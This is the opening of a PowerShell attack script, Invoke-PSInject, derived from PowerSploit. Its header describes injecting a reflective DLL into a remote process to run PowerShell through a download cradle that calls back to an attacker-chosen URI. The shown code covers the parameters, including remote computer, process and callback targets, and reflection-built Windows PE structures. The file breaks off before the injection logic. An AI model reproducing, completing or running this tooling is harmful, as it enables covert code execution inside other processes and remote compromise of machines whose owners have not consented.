function Invoke-PSInject
{
<#
.SYNOPSIS

This script leverages Invoke-ReflectivePEInjection to inject a reflective DLL which will load and run powershell in a remote process. This is 
based on the Invoke-Mimikatz script and leverages a similar technique of embedding base64 encoded bytes into the script. The encdoed DLL is from the
PowerPick project (ReflectivePick). The ReflectivePick project is heavily based on and uses code from Lee Christensen (@tifkin_). Thanks to everybody 
for their work on solving this interesting problem! 

PowertToolsFunction: Invoke-PSInject
Author: Justin Warner, Twitter: @sixdub

PowerSploit Function: Invoke-ReflectivePEInjection
Author: Joe Bialek, Twitter: @JosephBialek
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None
Version: 1.3

DLL Code: UnamanagedPowerShell
Author: Lee Christensen (@tifkin_)
License: None Stated?
Version: 1.0
Github: https://github.com/leechristensen/UnmanagedPowerShell

.DESCRIPTION

Reflectively loads PowerPick (ReflectivePick) in memory which then loads/runs powershell using the .NET assemblies. 

.PARAMETER ComputerName

Optional, an array of computernames to run the script on.

.PARAMETER ProcName
Optional, the name of the remote process to inject the DLL in to. If not injecting in to remote process, ignore this.

.PARAMETER ProcId
Optional, the process ID of the remote process to inject the DLL in to. If not injecting in to remote process, ignore this.

.PARAMETER CallbackURI
Mandatory, the URL to make the injected download cradle call back to! 

.LINK

Original blog on reflective loading: http://clymb3r.wordpress.com/2013/04/06/reflective-dll-injection-with-powershell/

#>

[CmdletBinding(DefaultParameterSetName="WebFile")]
Param(
	
	[Parameter(Position = 1)]
	[String[]]
	$ComputerName,
	
	[Parameter(Position = 2)]
    [ValidateSet( 'WString', 'String', 'Void', 'Other' )]
	[String]
	$FuncReturnType = 'Other',
	
	[Parameter(Position = 3)]
	[String]
	$ExeArgs,
	
	[Parameter(Position = 4)]
	[Int32]
	$ProcId,
	
	[Parameter(Position = 5)]
	[String]
	$ProcName,
	
	[Parameter(Position = 6, Mandatory = $true)]
	[ValidateLength(1,48)]
	[String]
	$CallbackURI,

    [Parameter(Position = 7)]
    [Switch]
    $ForceASLR
)

Set-StrictMode -Version 2


$RemoteScriptBlock = {
	[CmdletBinding()]
	Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		$PEBytes64,

        [Parameter(Position = 1, Mandatory = $true)]
		[String]
		$PEBytes32,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FuncReturnType,
				
		[Parameter(Position = 2, Mandatory = $true)]
		[Int32]
		$ProcId,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$ProcName,

        [Parameter(Position = 4, Mandatory = $true)]
        [Bool]
        $ForceASLR,
		
		[Parameter(Position = 5, Mandatory = $true)]
		[String]
		$CallbackURI
	)
	
	###################################
	##########  Win32 Stuff  ##########
	###################################
	Function Get-Win32Types
	{
		$Win32Types = New-Object System.Object

		#Define all the structures/enums that will be used
		#	This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
		$Domain = [AppDomain]::CurrentDomain
		$DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
		$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
		$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
		$ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]


		############    ENUM    ############
		#Enum MachineType
		$TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
		$TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
		$MachineType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType

		#Enum MagicType
		$TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
		$MagicType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType

		#Enum SubSystemType
		$TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
		$SubSystemType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType

		#Enum DllCharacteristicsType
		$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
		$TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
		$TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
		$TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
		$TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
		$DllCharacteristicsType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType

		###########    STRUCT    ###########
		#Struct IMAGE_DATA_DIRECTORY
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
		($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
		$IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY

		#Struct IMAGE_FILE_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
		$IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER

		#Struct IMAGE_OPTIONAL_HEADER64
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
		$IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64

		#Struct IMAGE_OPTIONAL_HEADER32
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		$IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32

		#Struct IMAGE_NT_HEADERS64
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
		$IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64
		
		#Struct IMAGE_NT_HEADERS32
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
		$IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32

		#Struct IMAGE_DOS_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
		$TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

		$e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
		$e_resField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

		$e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
		$e_res2Field.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
		$IMAGE_DOS_HEADER = $TypeBuilder.CreateType()	
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER

		#Struct IMAGE_SECTION_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)

		$nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
		$nameField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER

		#Struct IMAGE_BASE_RELOCATION
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
		$IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION

		#Struct IMAGE_IMPORT_DESCRIPTOR
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
		$IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR

		#Struct IMAGE_EXPORT_DIRECTORY
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
		$IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY
		
		#Struct LUID
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
		$LUID = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
		
		#Struct LUID_AND_ATTRIBUTES
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
